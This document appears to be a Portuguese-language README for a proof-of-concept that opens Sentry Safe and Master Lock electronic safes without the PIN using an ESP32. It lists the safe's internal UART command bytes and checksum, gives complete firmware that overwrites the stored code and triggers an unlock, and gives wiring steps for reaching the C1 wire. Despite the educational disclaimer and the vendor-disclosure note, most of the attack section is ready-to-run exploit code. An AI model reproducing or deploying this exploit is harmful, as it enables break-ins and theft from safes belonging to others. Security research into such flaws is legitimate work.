# How to open a Sentry Safe or Master Lock electronic safe with ESP32

## ⚠️ Aviso
Este projeto é apenas para **fins educacionais e de pesquisa de segurança**.  
Não use de forma ilegal. Sempre tenha permissão do dono do equipamento.

---

## TL;DR

Uma vulnerabilidade permite abrir cofres eletrônicos da Sentry Safe e Master Lock **sem conhecer o código PIN**.

A fabricante foi notificada mas não respondeu.  
Aqui, adaptamos a prova de conceito para rodar em um **ESP32**.

---

## História

Tudo começou capturando sinais entre a placa do teclado e a placa da fechadura do cofre.  
Descobriu-se que a comunicação usa **UART a 4800 baud** sobre um único fio (C1).

Foi possível mapear os **comandos** enviados e descobrir que é possível **sobrescrever o código** sem saber o código anterior.

---

## Conexão de fios

| Cofre  | ESP32           |
|--------|-----------------|
| GND    | GND             |
| C1     | GPIO 4 (TX)     |

> **Nota:** O fio **C1** é ligado no pino **TX** configurado no código do ESP32.  
> Não é necessário ligar a alimentação do cofre no ESP32 — apenas compartilhar o GND e enviar o sinal no C1.

---

## Comandos conhecidos

| Command byte | Função                       |
|--------------|------------------------------|
| 0x71         | Tentar abrir (try unlock)    |
| 0x75         | Salvar novo código (slot 1)  |
| 0x76         | Salvar novo código (slot 2)  |
| 0x74         | Iniciar mudança de código 1  |
| 0x72         | Iniciar mudança de código 2  |
| 0x78         | Boot                         |

O checksum é calculado como:
checksum = command + a + b + c + d + e

---

## Código ESP32 (Prova de Conceito)

```cpp
#include <Arduino.h>

// Pino TX ligado no fio C1
#define PIN_C1 4

HardwareSerial C1Serial(1);

void send_request(int command, int a, int b, int c, int d, int e) {
  int checksum = (command + a + b + c + d + e);

  // Pulso de wake-up
  pinMode(PIN_C1, OUTPUT);
  digitalWrite(PIN_C1, LOW);
  delayMicroseconds(2750);
  digitalWrite(PIN_C1, HIGH);
  delayMicroseconds(200);

  // Comunicação UART a 4800 baud
  C1Serial.begin(4800, SERIAL_8N1, -1, PIN_C1);
  C1Serial.write((byte)0x00);
  C1Serial.write(command);
  C1Serial.write(a);
  C1Serial.write(b);
  C1Serial.write(c);
  C1Serial.write(d);
  C1Serial.write(e);
  C1Serial.write(checksum);
  C1Serial.flush();
  C1Serial.end();

  // Pino em nível alto no fim
  pinMode(PIN_C1, OUTPUT);
  digitalWrite(PIN_C1, HIGH);
}

void reset_code(int a, int b, int c, int d, int e) {
  send_request(0x75, a, b, c, d, e);
}

void try_code(int a, int b, int c, int d, int e) {
  send_request(0x71, a, b, c, d, e);
}

void setup() {
  // Define novo código 1-2-3-4-5 e tenta abrir
  reset_code(1, 2, 3, 4, 5);
  delay(1000);
  try_code(1, 2, 3, 4, 5);
}

void loop() {}
```
# Como usar
Retire o parafuso frontal do cofre para acessar os fios internos.

Conecte o GND do ESP32 ao fio preto do cofre.

Conecte o GPIO 4 (TX) do ESP32 ao fio C1 (geralmente verde).

Alimente o ESP32 e o código enviará o comando para definir um novo código e abrir o cofre.

